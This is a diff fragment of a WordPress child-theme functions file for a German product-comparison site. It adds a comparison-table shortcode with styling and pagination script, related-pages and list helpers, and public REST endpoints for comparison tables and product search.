+                } elseif ($test_note>4 && $test_note<=6) {
+                    $praedikat=__('Insufficient', 'woodmart-child');
+                } else {
+                    $praedikat=__('Error!', 'woodmart-child');
+                }
+                if(get_field('field_is_sponsored')=='1') {
+                    $testNote.='<span class="testNotePraedikat">Unsere<br />Empfehlung</span><span class="testProdutctType">'.$productType.'</span>';
+                } else {
+                    $testNote.='<span class="testNoteVal">'.number_format_i18n($test_note, 1).'</span>';
+                    $testNote.='<span class="testNotePraedikat">'.$praedikat.'</span><span class="testProdutctType">'.$productType.'</span>';
+                }
+                $testNote.='</div></a>';
+                $rows['grade'][]=$testNote;
+            }
+        }
+        // Format min and max prices
+        $allProductsData['minprice'] = esc_html__('ca.', 'woodmart-child').' '.number_format_i18n($allProductsData['minprice'], 2).' &euro;';
+        $allProductsData['maxprice'] = esc_html__('ca.', 'woodmart-child').' '.number_format_i18n($allProductsData['maxprice'], 2).' &euro;';
+        $rows=array_filter($rows, function ($k) use ($rows) {
+            return count(array_filter($rows[$k]))>1;
+        }, ARRAY_FILTER_USE_KEY);
+        // output content
+    ?>
+    <?php if ($found_products>1):?>
+    <div class="mb-4 ct-pagination">
+        <button class="btn btn-primary left-button" id="previous_btn" title="<?php esc_html_e('Previous', 'woodmart-child');?>">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <button class="btn btn-primary float-right right-button" id="next_btn" title="<?php esc_html_e('Next', 'woodmart-child');?>">
+            <i class="fas fa-chevron-right"></i>
+        </button>
+    </div>
+    <?php endif;?>
+    <div class="row mb-4 ct-scroller">
+        <div class="col-xs-12 ct-wrapper">
+            <table class="ct-table">
+            <?php $i=0; foreach ($rows as $index=>$row) : ?>
+                <tr class="<?php echo ($i>0)?'ct-table-row':'ct-table-header';?>">
+                <?php
+                    foreach ($row as $k=>$col):
+                        // always subtract 1 from $flagMapping since first_col is heading
+                        $flag_class = $flagMapping[$k-1] ?? '';
+                        if ($index=='image') $flag_class='';
+                        if ($k==0) {
+                            $class='ct-header';
+                            $col_element='th';
+                        } else {
+                            $class='ct-col-'.$k;
+                            $col_element='td';
+                        }
+                    ?>
+                        <<?php echo $col_element;?> class="<?php echo $class;?> <?php echo $flag_class;?>"><?php echo $col; ?></<?php echo $col_element;?>>
+                    <?php $i++; endforeach;?>
+                </tr>
+                <?php endforeach; ?>
+            </table>
+        </div>
+    </div>
+
+    <?php
+        if ($found_products>1 && !$a['api']):
+            echo get_comparison_table_js();
+        endif;
+    ?>
+    <?php
+    endif;
+    wp_reset_postdata();
+
+    $output = ob_get_contents();
+    ob_end_clean();
+    return tv2_strip_external_jsonld($output);
+}
+function get_comparison_table_style($api = false) {
+    ob_start();
+    ?>
+    <style>
+        /* fix font awesome external prefix*/
+        .fas {
+            display: inline-block;
+            font: normal normal normal 14px/1 FontAwesome;
+            font-size: inherit;
+            text-rendering: auto;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        /* fix bootstrap */
+        .ct-wrapper .mr-2, .ct-wrapper .mx-2 {
+            margin-right: 0.5rem!important;
+        }
+        .ct-wrapper .btn, .ct-wrapper .button, .ct-wrapper button, .ct-wrapper [type="submit"], .ct-wrapper [type="button"] {
+            padding: 12px 20px;
+            font-size: 13px;
+            line-height: 18px;
+            background-color: #F3F3F3;
+            color: #3E3E3E;
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            outline: none;
+            border-width: 0;
+            border-style: solid;
+            border-color: transparent;
+            border-radius: 0;
+            box-shadow: none;
+            vertical-align: middle;
+            text-align: center;
+            text-decoration: none;
+            text-transform: uppercase;
+            text-shadow: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: color .25s ease, background-color .25s ease, border-color .25s ease, box-shadow .25s ease, opacity .25s ease;
+        }
+        .ct-wrapper .float-right {
+            float: right!important;
+        }
+        /**** Comparison Table ************/
+        .ct-scroller {
+            position: relative;
+            max-width: 100%;
+            margin: auto;
+            overflow: hidden;
+        }
+        .ct-wrapper {
+            width: 100%;
+            overflow: hidden;
+        }
+        .ct-table {
+            border: none;
+            border-right: #DDEFEF 1px solid;
+            border-top: #DDEFEF 1px solid;
+            border-collapse: separate;
+            border-spacing: 0;
+            font-size: 14px;
+            width: 100%;
+            margin: auto;
+            border-spacing: 0;
+            table-layout: fixed
+        }
+        .ct-table td, .ct-table th {
+            vertical-align: top;
+            border: none;
+            border-left: #DDEFEF 1px solid;
+            border-bottom: #DDEFEF 1px solid;
+            padding: 15px 12px;
+        }
+        .ct-table td .mobile-heading {
+            display: none;
+        }
+        .ct-table-header td {
+            padding: 0;
+        }
+        .ct-table-row:nth-child(2n-1) td, .ct-table-row:nth-child(2n-1) th {
+            background-color: #fcfcfc
+        }
+        .ct-image {
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 7px;
+        }
+        .ct-image img {
+            max-height: 100%;
+            max-width: 300px;
+        }
+        /* hide and display columns according to screen width */
+        .ct-table .award {
+            height: 36px;
+            text-align: center;
+            line-height: 36px;
+            font-weight: bold;
+            color: #FFF;
+        }
+        .ct-table .award.award-100 {
+            background-color: #3D88D7;
+        }
+        .ct-table .award.award-50 {
+            background-color: #76B50E;
+        }
+        .ct-table .award.award-10 {
+            background-color: #4287f5;
+        }
+        .ct-table td.flag-100 {
+            background-color: #D3E8FF63 ;
+        }
+        .ct-table td.flag-50 {
+            background-color: #F0FFEF;
+        }
+        .ct-pagination {
+            width: 100%;
+            max-width: 1370px;
+        }
+        .ct-pagination-fixed {
+            width: calc(100% - 30px);
+            position: fixed;
+            top: 300px;
+            z-index: 10;
+        }
+        .ct-pagination-fixed button {
+            opacity: 1 !important;
+        }
+        .ct-table td, .ct-table th {
+            width: 16.66666%;
+        }
+        .ct-table tr td:nth-child(n+7) {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .ct-table td, .ct-table th {
+                width: 25%;
+            }
+            .ct-table tr td:nth-child(n+5) {
+                display: none;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .ct-table td, .ct-table th {
+                width: 50%;
+            }
+            .ct-table tr td:nth-child(n+4) {
+                display: none;
+            }
+            .ct-table tr th:nth-child(1) {
+                display: none;
+            }
+            .ct-table td .mobile-heading {
+                text-align: center;
+                display: block;
+                font-weight: bold;
+                color: #0176dd;
+            }
+        }
+        .ct-hidden-col {
+            display:none !important;
+        }
+
+        .ct-visible-col {
+            display:table-cell !important;
+        }
+        img.ct-merchant-logo {
+            max-height: 20px;
+            margin: 0 auto 8px auto;
+            display: block;
+        }
+        .ct-wrapper .color-green {
+            color: #83b735;
+        }
+        .ct-wrapper .color-red {
+            color: #ac3c3a;
+        }
+        .ct-wrapper .fa-lg {
+            font-size: 1.5em;
+        }
+        .ct-wrapper .btn-offer {
+            display: block;
+            color: #FFF;
+            background-color: #83b735;
+        }
+        .ct-wrapper .btn-offer:hover {
+            color: #FFF;
+            background-color: #638a28;
+        }
+        /* Siegel */
+        .ct-wrapper .testNote {
+            text-transform: uppercase;
+            padding: 5px 0 10px 0;
+            background-color: #FFF;
+            width: 150px;
+            max-width: 100%;
+            min-height: 150px;
+            margin: 10px auto;
+            text-align: center;
+            border: 3px solid #0176dd;
+            color: #383838;
+        }
+        .ct-wrapper .siegel_topProduct {
+            border-color: #33dfb7;
+        }
+        .ct-wrapper .siegel_priceChamp {
+            border-color: #62d147;
+        }
+        .ct-wrapper .testLabel {
+            font-weight: bold;
+            font-size: 15px;
+            line-height: 27px;
+            display: block;
+            justify-content: center;
+            align-items: center;
+        }
+        .ct-wrapper .testLabel b {
+            font-size: 30px;
+        }
+
+        .ct-wrapper .testLabel b, .ct-wrapper .testLabel em {
+            display: block;
+            font-style: normal;
+        }
+        .ct-wrapper .blogName {
+            color: #383838;
+            display: block;
+            padding: 8px 0;
+            font-size: 10px;
+        }
+        .ct-wrapper .testNoteVal, .ct-wrapper .testNotePraedikat {
+            display: block;
+            line-height: 35px;
+            font-size: 18px;
+            color: #3F3F3F;
+            font-weight: bold;
+        }
+        .ct-wrapper .testNoteVal {
+            padding-top: 0px;
+            margin-bottom: 0px;
+            font-size: 35px;
+        }
+        .ct-wrapper .testNotePraedikat {
+            margin: 0px;
+            border-bottom: 1px solid #d8d8d8;
+        }
+        .ct-wrapper .testProdutctType {
+            font-size: 10px;
+            font-weight: bold;
+        }
+    </style>
+    <?php
+    $output = ob_get_contents();
+    ob_end_clean();
+    return tv2_strip_external_jsonld($output);
+}
+
+function get_comparison_table_js($limit=false) {
+    ob_start();
+    ?>
+    <script>
+        jQuery(document).ready(function ($) {
+            var paginationEndPosition = $('.ct-pagination').height()+120;
+            $(window).bind('scroll', function () {
+                var tableStartPosition = $('.ct-scroller').offset().top;
+                var tableEndPosition = $('.ct-scroller').offset().top + $('.ct-scroller').height();
+                if ($(window).scrollTop() >= tableStartPosition && $(window).scrollTop() <= (tableEndPosition-paginationEndPosition)) {
+                    $('.ct-pagination').addClass('ct-pagination-fixed');
+                } else {
+                    $('.ct-pagination').removeClass('ct-pagination-fixed');
+                }
+            });
+        });
+
+        var table_td_1_next;        // Always 1
+        var table_td_2_next;        // No. of products showing on screen + 1
+        var table_td_1_previous;    // No. of products showing on screen
+        var table_td_2_previous;    // Always 0
+        var col_elements;
+
+        jQuery(document).ready(function ($) {
+
+            document.getElementById("previous_btn").disabled = true;
+
+            // Next and Previous buttons Logic
+
+            col_elements1 = document.getElementsByClassName("ct-table-row")[0]
+            col_elements = col_elements1.getElementsByTagName("td")
+
+
+            if (window.innerWidth > 768) {
+                table_td_1_next = 1;
+                <?php if ($limit>0): $max = (int)$limit ?>
+                table_td_2_next = <?= $max+1 ?>;
+                table_td_1_previous = <?= $max ?>;
+                <?php else: $max = 7; ?>
+                table_td_2_next = 8;
+                table_td_1_previous = 7;
+                <?php endif;?>
+                table_td_2_previous = 0;
+
+                if (col_elements.length <= <?= $max ?>) {
+                    document.getElementById("next_btn").disabled = true;
+                }
+            }
+            if (window.innerWidth > 425 && window.innerWidth <= 768) {
+                table_td_1_next = 1;
+                table_td_2_next = 4;
+                table_td_1_previous = 3;
+                table_td_2_previous = 0;
+
+                if (col_elements.length <= 3) {
+                    document.getElementById("next_btn").disabled = true;
+                }
+            }
+            if (window.innerWidth <= 425) {
+                table_td_1_next = 1;
+                table_td_2_next = 3;
+                table_td_1_previous = 2;
+                table_td_2_previous = 0;
+
+                if (col_elements.length <= 2) {
+                    document.getElementById("next_btn").disabled = true;
+                }
+            }
+
+            // Adding headers automatically using js in mobile view
+
+            var rows_headers_elements;
+            var rows_data_elements;
+            table_rows_elements = document.getElementsByClassName("ct-table-row")
+
+            for (var i=0; i<table_rows_elements.length; i+=1){
+
+                rows_headers_elements = table_rows_elements[i].getElementsByTagName("th")
+                rows_data_elements = table_rows_elements[i].getElementsByTagName("td")
+
+                const header = document.createElement("div");
+                const node = document.createTextNode(rows_headers_elements[0].innerText);
+
+                header.setAttribute('class', "mobile-heading");
+                header.appendChild(node);
+
+                for (var j=0; j<rows_data_elements.length; j++){
+                    rows_data_elements[j].innerHTML = header.outerHTML + rows_data_elements[j].innerHTML;
+                }
+
+            }
+        });
+
+
+        function next() {
+
+            elements_1 = document.getElementsByClassName("ct-col-" + table_td_1_next.toString());
+            for (var i=0;i<elements_1.length;i+=1){
+                elements_1[i].style.display = 'none';
+            }
+
+            elements_2 = document.getElementsByClassName("ct-col-" + table_td_2_next.toString());
+            for (var i=0;i<elements_2.length;i+=1){
+                elements_2[i].style.display = 'table-cell';
+            }
+
+            table_td_1_next ++;
+            table_td_2_next ++;
+            table_td_1_previous ++;
+            table_td_2_previous ++;
+
+
+            if (table_td_1_next != 1) {
+                document.getElementById("previous_btn").disabled = false;
+            }
+
+            if (table_td_2_next == col_elements.length+1) {
+                document.getElementById("next_btn").disabled = true;
+            }
+
+        }
+
+        function previous() {
+
+            elements_1 = document.getElementsByClassName("ct-col-" + table_td_1_previous.toString());
+            for (var i=0;i<elements_1.length;i+=1){
+                elements_1[i].style.display = 'none';
+            }
+
+            elements_2 = document.getElementsByClassName("ct-col-" + table_td_2_previous.toString());
+            for (var i=0;i<elements_2.length;i+=1){
+                elements_2[i].style.display = 'table-cell';
+            }
+
+            table_td_1_previous --;
+            table_td_2_previous --;
+            table_td_1_next --;
+            table_td_2_next --;
+
+
+            if (table_td_1_next == 1) {
+                document.getElementById("previous_btn").disabled = true;
+            }
+
+            if (table_td_2_next != col_elements.length  ) {
+                document.getElementById("next_btn").disabled = false;
+            }
+        }
+
+        jQuery(document).ready(function ($) {
+            $('#next_btn').click(function () {
+               next();
+            })
+            $('#previous_btn').click(function () {
+                previous();
+            })
+        });
+
+
+    </script>
+    <?php
+    $output = ob_get_contents();
+    ob_end_clean();
+    return tv2_strip_external_jsonld($output);
+}
+
+add_shortcode( 'related_pages', 'render_related_pages' );
+function render_related_pages( $atts ) {
+    $a = shortcode_atts( [
+        'id' => '',// page ID
+    ], $atts );
+    if (empty((int)$a['id'])) return;
+    $categories=get_the_terms($a['id'], 'category');
+    $category_ids=implode(',', @wp_list_pluck($categories, 'term_id'));
+
+    ob_start();
+    $query = new WP_Query( ['post_type' => 'page', 'post__not_in' => [$a['id']], 'posts_per_page' => 6, 'orderby' => 'rand', 'cat' => $category_ids ] );
+
+    if($query->have_posts()) :
+    ?>
+    <div class="row row-cols-2 row-cols-md-3 row-cols-lg-6">
+    <?php
+        while ( $query->have_posts() ) :$query->the_post();
+    ?>
+        <div class="col mb-5">
+            <div class="text-truncate related-pages">
+                <a href="<?php the_permalink();?>"><?php the_post_thumbnail('thumbnail', ['alt'=>get_the_title()]);?><span class="related-pages-title"><?php the_title();?></span></a>
+            </div>
+        </div>
+    <?php
+        endwhile;
+    ?>
+    </div>
+    <style>
+        .related-pages {
+            border: 1px solid #DDEFEF;
+            border-radius: 5px;
+            line-height: 45px;
+        }
+        .related-pages a {
+            display: block;
+        }
+        .related-pages img {
+            display: block;
+            max-width: 75%;
+            width: auto;
+            margin: 10px auto;
+        }
+        .related-pages-title {
+            display: block;
+            text-align: center;
+            font-weight: bold;
+        }
+        </style>
+    <?php
+    endif;
+    wp_reset_postdata();
+
+    $output = ob_get_contents();
+    ob_end_clean();
+    return tv2_strip_external_jsonld($output);
+}
+if(!function_exists('text_to_list')) {
+    function text_to_list($text, $class='', $prefix='') {
+        $output=preg_split('/(,|\|)/', $text ?? '', -1, PREG_SPLIT_NO_EMPTY);
+        if (count($output)<1)
+            return $text;
+        return '<ul'.(!empty($class)?' class="'.$class.'"':'').'><li>'.$prefix.implode('</li><li>'.$prefix, $output).'</li></ul>';
+    }
+}
+if(!function_exists('text_to_list_box')) {
+    function text_to_list_box($text, $class='', $prefix='') {
+        $output=preg_split('/(,|\|)/', $text ?? '', -1, PREG_SPLIT_NO_EMPTY);
+        if (count($output)<1)
+            return $text;
+        return '<ul'.(!empty($class)?' class="'.$class.'"':'').'><li>'.$prefix.implode('</li><li>'.$prefix, array_slice($output, 0, 3)).'</li></ul>';
+    }
+}
+if (!function_exists('get_generic_content_by_pool_count')) {
+    function get_generic_content_by_pool_count($pool_slug) {
+        if (empty($pool_slug)) return;
+        $transient_key = 'generic_content_count_'.sanitize_key($pool_slug);
+        $transient = get_transient($transient_key);
+        if ($transient!=""):
+            return $transient;
+        else:
+            $args['post_type']='generic_content';
+            $args['tax_query']= [
+                [
+                    'taxonomy' => 'generic_content_pool',
+                    'field'    => 'slug',
+                    'terms'    => $pool_slug,
+                ]
+            ];
+            $query = new WP_Query( $args );
+            $count = $query->found_posts;
+            wp_reset_postdata();
+            set_transient( $transient_key, $count, 86400 ); // two days
+            return $count;
+        endif;
+    }
+}
+if (!function_exists('get_generic_content_by_pool')) {
+    function get_generic_content_by_pool ($pool_slug, $replaces = [], $offset = null) {
+        if (empty($pool_slug)) return;
+        if (empty($replaces)) $replaces = ['s' => [], 'r' => []];
+        $retVal=['title'=>'', 'content'=>''];
+        $args['post_type']='generic_content';
+        $args['posts_per_page']=1;
+        if (is_null($offset)) {
+            $args['orderby']='rand';
+        } else {
+            $args['offset'] = (int)$offset;
+        }
+        $args['tax_query']= [
+            [
+                'taxonomy' => 'generic_content_pool',
+                'field'    => 'slug',
+                'terms'    => $pool_slug,
+            ]
+        ];
+        $query = new WP_Query( $args );
+        if ( $query->have_posts() ) :
+            while ( $query->have_posts() ) : $query->the_post();
+                $retVal['title']=str_replace($replaces['s'], $replaces['r'], get_the_title());
+                $retVal['content']=str_replace($replaces['s'], $replaces['r'], get_the_content());
+            endwhile;
+            wp_reset_postdata();
+        endif;
+        return $retVal;
+    }
+}
+
+// change search form
+// **********************************************************************//
+// Search form
+// **********************************************************************//
+if( ! function_exists( 'woodmart_search_form' ) && 1==2) {
+    function woodmart_search_form( $args = array() ) {
+
+        $args = wp_parse_args( $args, array(
+            'ajax' => false,
+            'post_type' => false,
+            'show_categories' => false,
+            'type' => 'form',
+            'thumbnail' => true,
+            'price' => true,
+            'count' => 20,
+            'icon_type' => '',
+            'search_style' => '',
+            'custom_icon' => '',
+            'el_classes' => '',
+            'wrapper_custom_classes' => '',
+        ) );
+
+        extract( $args );
+
+        ob_start();
+
+        $class = '';
+        $btn_classes = '';
+        $data  = '';
+        $wrapper_classes = '';
+        $dropdowns_classes = '';
+
+        if ( $show_categories && $post_type == 'product' ) {
+            $class .= ' wd-with-cat';
+            $class .= woodmart_get_old_classes( ' has-categories-dropdown' );
+        }
+
+        if ( $icon_type == 'custom' ) {
+            $btn_classes .= ' wd-with-img';
+            $btn_classes .= woodmart_get_old_classes( ' woodmart-searchform-custom-icon' );
+        }
+
+        if ( $search_style ) {
+            $class .= ' wd-style-' . $search_style;
+            $class .= woodmart_get_old_classes( ' search-style-' . $search_style );
+        }
+
+        $ajax_args = array(
+            'thumbnail' => $thumbnail,
+            'price' => $price,
+            'post_type' => $post_type,
+            'count' => $count,
+            'sku' => woodmart_get_opt( 'show_sku_on_ajax' ) ? '1' : '0',
+            'symbols_count' => apply_filters( 'woodmart_ajax_search_symbols_count', 3 ),
+        );
+
+        if( $ajax ) {
+            $class .= ' woodmart-ajax-search';
+            woodmart_enqueue_js_library( 'autocomplete' );
+            woodmart_enqueue_js_script( 'ajax-search' );
+            foreach ($ajax_args as $key => $value) {
+                $data .= ' data-' . $key . '="' . $value . '"';
+            }
+        }
+
+        switch ( $post_type ) {
+            case 'product':
+                $placeholder = esc_attr_x( 'Search for products', 'submit button', 'woodmart' );
+                $description = esc_html__( 'Start typing to see products you are looking for.', 'woodmart' );
+                break;
+
+            case 'portfolio':
+                $placeholder = esc_attr_x( 'Search for projects', 'submit button', 'woodmart' );
+                $description = esc_html__( 'Start typing to see projects you are looking for.', 'woodmart' );
+                break;
+
+            default:
+                $placeholder = esc_attr_x( 'Search for posts', 'submit button', 'woodmart' );
+                $description = esc_html__( 'Start typing to see posts you are looking for.', 'woodmart' );
+                break;
+        }
+
+        if ( $el_classes ) {
+            $class .= ' ' . $el_classes;
+        }
+
+        if ( $wrapper_custom_classes ) {
+            $wrapper_classes .= ' ' . $wrapper_custom_classes;
+        }
+
+        if ( 'dropdown' === $type ) {
+            $wrapper_classes .= ' wd-dropdown';
+        }
+
+        if ( 'full-screen' === $type ) {
+            woodmart_enqueue_js_script( 'search-full-screen' );
+            $wrapper_classes .= ' wd-fill';
+        } else {
+            $dropdowns_classes .= ' wd-dropdown';
+        }
+
+        if ( 'light' === whb_get_dropdowns_color() ) {
+            if ( 'form' !== $type ) {
+                $wrapper_classes .= ' color-scheme-light';
+            }
+            $dropdowns_classes .= ' color-scheme-light';
+        }
+
+        $wrapper_classes .= woodmart_get_old_classes( ' woodmart-search-' . $type );
+        $dropdowns_classes .= woodmart_get_old_classes( ' woodmart-search-results' );
+
+        ?>
+        <div class="wd-search-<?php echo esc_attr( $type ); ?> <?php echo esc_attr( $wrapper_classes ); ?>">
+            <?php if ( $type == 'full-screen' ): ?>
+                <span class="wd-close-search wd-action-btn wd-style-icon wd-cross-icon<?php echo woodmart_get_old_classes( ' woodmart-close-search' ); ?>"><a></a></span>
+            <?php endif ?>
+            <form role="search" method="get" class="searchform <?php echo esc_attr( $class ); ?>" action="<?php echo esc_url( home_url( '/' ) ); ?>" <?php echo ! empty( $data ) ? $data : ''; ?>>
+                <input type="text" class="s" placeholder="<?php echo esc_attr( $placeholder ); ?>" value="<?php echo get_search_query(); ?>" name="s" aria-label="<?php esc_html_e( 'Search', 'woodmart' ); ?>" title="<?php echo esc_attr( $placeholder ); ?>" />
+                <input type="hidden" name="post_type" value="<?php echo esc_attr( $post_type ); ?>">
+                <?php if( $show_categories && $post_type == 'product' ) woodmart_show_categories_dropdown(); ?>
+                <button type="submit" class="searchsubmit<?php echo esc_attr( $btn_classes ); ?>">
+                    <?php echo esc_attr_x( 'Search', 'submit button', 'woodmart' ); ?>
+                    <?php
+                    if ( $icon_type == 'custom' ) {
+                        echo whb_get_custom_icon( $custom_icon );
+                    }
+                    ?>
+                </button>
+            </form>
+            <?php if ( $type == 'full-screen' ): ?>
+                <div class="search-info-text"><span><?php echo esc_html( $description ); ?></span></div>
+            <?php endif ?>
+            <?php //if ( $ajax ): ?>
+            <div class="search-results-wrapper">
+                <div class="wd-dropdown-results wd-scroll<?php echo esc_attr( $dropdowns_classes ); ?>">
+                    <div class="wd-scroll-content"></div>
+                </div>
+
+                <?php if ( 'full-screen' === $type ) : ?>
+                    <div class="wd-search-loader wd-fill<?php echo woodmart_get_old_classes( ' woodmart-search-loader' ); ?>"></div>
+                <?php endif; ?>
+            </div>
+            <?php //endif ?>
+        </div>
+        <?php
+
+        echo apply_filters( 'get_search_form', ob_get_clean() );
+    }
+}
+function bts_change_search_form ($form) {
+    global $search_form_modified;
+    if ($search_form_modified) return $form;
+    ob_start();
+    $search_form_modified = true;
+    require(get_stylesheet_directory().'/search-js.php');
+    $search_js = ob_get_clean();
+    return $form.' '.$search_js;
+}
+
+add_filter('get_search_form', 'bts_change_search_form');
+
+// add custom api endpoint to render comparison table
+add_action( 'rest_api_init', function () {
+    register_rest_route( 'bts/v2', 'cp/(?P<slug>.+)', array(
+        'methods' => 'GET',
+        'callback' => 'bts_api_cp_v2',
+        'permission_callback' => '__return_true',
+    ) );
+} );
+function bts_api_cp_v2(WP_REST_Request $request)
+{
+    global $allProductsData, $bestProductsData, $productTypeId;
+    $page = get_page_by_path(sanitize_title($request['slug']));
+    $output = [];
+    if (!is_null($page)) {
+        if (is_object_in_term($page->ID, 'product_type')) {
+            $term = get_the_terms($page->ID, 'product_type' );
+            if (count($term)==1) {
+                //$productTypeId = $term[0]->term_id;
+                $output['html'] = do_shortcode("[vergleichstabelle id='{$term[0]->term_id}' api='1']");
+                $output['js'] = get_comparison_table_js(5);
+                $output['css'] = get_comparison_table_style();
+                $output['faq_data'] = $allProductsData;
+                $output['best'] = $bestProductsData;
+            }
+        }
+    }
+    return tv2_strip_external_jsonld($output);
+}
+// add custom api endpoint for search V2
+add_action( 'rest_api_init', function () {
+    register_rest_route( 'bts/v2', 'search/(?P<keyword>.+)', array(
+        'methods' => 'GET',
+        'callback' => 'bts_api_search_v2',
+        'permission_callback' => '__return_true',
+    ) );
+} );
+function bts_api_search_v2(WP_REST_Request $request)
+{
+        $posts = []; // empty array for the returned results
+        $types = ['page' => esc_html__('Comparison', 'woodmart-child'), 'advisor_product' => esc_html__('Products', 'woodmart-child')];
+        foreach ($types as $type => $typeHeading) :
+            $args = array(
+                'post_type' => $type,
+                'posts_per_page' => 6,
+                's' => rawurldecode($request['keyword']),
+                'ep_integrate' => true
+            );
+            if ($type=='advisor_product') {
+                $args['meta_query'] = [
+                    [
+                        'relation' => 'AND',
+                        'flag_clause' => [
+                            'key' => 'flag',
+                            'type' => 'NUMERIC'
+                        ],
+                        'grade_clause' => [
+                            'key' => 'grade',
+                            'type' => 'DECIMAL(3,2)'
+                        ]
+                    ]
+                ];
+                /*
+                $args['orderby'] = [
+                    'flag_clause' => 'DESC',
+                    'grade_clause' => 'ASC',
+                ];
+                */
+            }
+            $query = new WP_Query($args);
+            //file_put_contents(get_stylesheet_directory().'/out.txt', var_export($args, true), FILE_APPEND);
+            if ($query->have_posts()) {
+                while ($query->have_posts()) {
+                    $query->the_post();
+                    //file_put_contents(get_stylesheet_directory().'/out.txt', var_export(get_post(), true), FILE_APPEND);
+                    $row=[];
+                    $row['title'] = get_the_title();
+                    $row['image'] = get_the_post_thumbnail(null, 'thumbnail');
+                    $row['link'] = get_the_permalink();
+                    if ($type=='advisor_product') {
+                        $offers=[];
+                        if(have_rows('offers')) {
+                            while (have_rows('offers')) {
+                                the_row();
+                                $offers[] = [
+                                    'regular_price' => (float)str_replace(',', '.', get_sub_field('price')),
+                                    'special_price' => (float)str_replace(',', '.', get_sub_field('special_price')),
+                                ];
+                            }
+                        }
+                        if (!empty($offers)) :
+                            $min_regular_price = min(array_filter(array_column($offers,'regular_price')));
+                            $min_special_price = min(array_merge([0], array_filter(array_column($offers,'special_price'))));
+
+                            $price = ($min_special_price>0)?$min_special_price:$min_regular_price;
+                            $row['price'] = '<span class="price-prefix">'.esc_html__('ca.', 'woodmart-child').'</span> '.number_format_i18n($price, 2).' &euro;';
+                        endif;
+                    } elseif ($type=='page') {
+                        $productTypeId = 0;
+                        if (is_object_in_term(get_the_ID(), 'product_type')) {
+                            $term = get_the_terms('', 'product_type' );
+                            if (count($term)==1) {
+                                $productTypeId=$term[0]->term_id;
+                            }
+                        }
+
+                        if (!empty($productTypeId)) {
+                            $args = array(
+                                'post_type' => 'advisor_product',
+                                'posts_per_page' => -1,
+                                'meta_query' => [
+                                    [
+                                        'key' => 'status',
+                                        'type' => 'NUMERIC',
+                                        'value' => 1
+                                    ]
+                                ],
+                                'tax_query' => array(
+                                    array(
+                                        'taxonomy' => 'product_type',
+                                        'field' => 'id',
+                                        'terms' => $productTypeId
+                                    )
+                                ),
+                            );
+                            $type_query = new WP_Query($args);
+                            if ($type_query->have_posts()) {
+                                $row['products'] = sprintf(esc_html__('%s products in comparison', 'woodmart-child'), $type_query->found_posts);
+                            }
+                            wp_reset_postdata();
+                        }
+
+                    }
+                    $posts[$typeHeading][]=$row;
+                }
+            } else {
+                //file_put_contents(get_stylesheet_directory().'/out.txt', 'No Results for type: '.$type."\r\n", FILE_APPEND);
+            }
+            wp_reset_postdata();
+        endforeach;
+        return [$posts];
+}
+
+function get_comparison_page_by_product_type($product_type = null) {
+    if (!$product_type) return false;
+    $comparison_url='';
+    $page_query_result = get_posts(
+        array(
+            'post_type' => 'page',
+            'numberposts' => 1,
+            'tax_query' => array(
+                array(
+                    'taxonomy' => 'product_type',
+                    'terms' => $product_type,
+                )
+            )
+        )
+    );
+    if (is_array($page_query_result) && count($page_query_result)==1) {
+        $page=$page_query_result[0];
+        $comparison_url=get_permalink($page->ID);
+    }
+    return $comparison_url;
+}
+
+// add custom api endpoint for search
+add_action( 'rest_api_init', function () {
+    register_rest_route( 'bts/v1', 'search/(?P<type>[\w-]+)/(?P<keyword>.+)', array(
+        'methods' => 'GET',
+        'callback' => 'bts_api_search',
+        'permission_callback' => '__return_true',
+    ) );
+} );
+function bts_api_search(WP_REST_Request $request)
+{
+    if (!post_type_exists($request['type'])) {
+        return new WP_Error(
+            'post_type_not_found',
+            __("Post Type doesn't exist"),
+            array('status' => 404)
+        );
+    }
+    $args = array(
+        'post_type' => $request['type'],
+        'posts_per_page' => 6,
+        's' => rawurldecode($request['keyword']),
+    );
+    if ($request['type']=='advisor_product') {
+        $args['meta_query'] = [
+            [
+                'relation' => 'AND',
+                'flag_clause' => [
+                    'key' => 'flag',
+                    'type' => 'NUMERIC'
+                ],
+                'grade_clause' => [
+                    'key' => 'grade',
+                    'type' => 'DECIMAL(3,2)'
+                ]
+            ]
+        ];
+        $args['orderby'] = [
+            'flag_clause' => 'DESC',
+            'grade_clause' => 'ASC',
+        ];
+    }
+    $query = new WP_Query($args);
+    $posts = [];
+    if ($query->have_posts()) {
+        while ($query->have_posts()) {
+            $query->the_post();
+            $row['title'] = get_the_title();
+            $row['image'] = get_the_post_thumbnail(null, 'thumbnail');
+            $row['link'] = get_the_permalink();
+            if ($request['type']=='advisor_product') {
+                $offers=[];
+                if(have_rows('offers')) {
+                    while (have_rows('offers')) {
+                        the_row();
+                        $offers[] = [
+                            'regular_price' => (float)str_replace(',', '.', get_sub_field('price')),
+                            'special_price' => (float)str_replace(',', '.', get_sub_field('special_price')),
+                        ];
+                    }
+                }
+                if (!empty($offers)) :
+                    $min_regular_price = min(array_filter(array_column($offers,'regular_price')));
+                    $min_special_price = min(array_filter(array_column($offers,'special_price')));
+
+                    $price = ($min_special_price>0)?$min_special_price:$min_regular_price;
+                    $row['price'] = '<span class="price-prefix">'.esc_html__('ca.', 'woodmart-child').'</span> '.number_format_i18n($price, 2).' &euro;';
+                endif;
+            } elseif ($request['type']=='page') {
+                $productTypeId = 0;
+                if (is_object_in_term(get_the_ID(), 'product_type')) {
+                    $term = get_the_terms('', 'product_type' );
+                    if (count($term)==1) {
+                        $productTypeId=$term[0]->term_id;
+                    }
+                }
+
+                if (!empty($productTypeId)) {
+                    $args = array(
+                        'post_type' => 'advisor_product',
+                        'posts_per_page' => -1,
+                        'meta_query' => [
+                            [
+                                'key' => 'status',
+                                'type' => 'NUMERIC',
+                                'value' => 1
+                            ]
+                        ],
+                        'tax_query' => array(
+                            array(
+                                'taxonomy' => 'product_type',
+                                'field' => 'id',
+                                'terms' => $productTypeId
+                            )
+                        ),
+                    );
+                    $type_query = new WP_Query($args);
+                    if ($type_query->have_posts()) {
+                        $row['products'] = sprintf(esc_html__('%s products in comparison', 'woodmart-child'), $type_query->found_posts);
+                    }
+                    wp_reset_postdata();
+                }
+
+            }
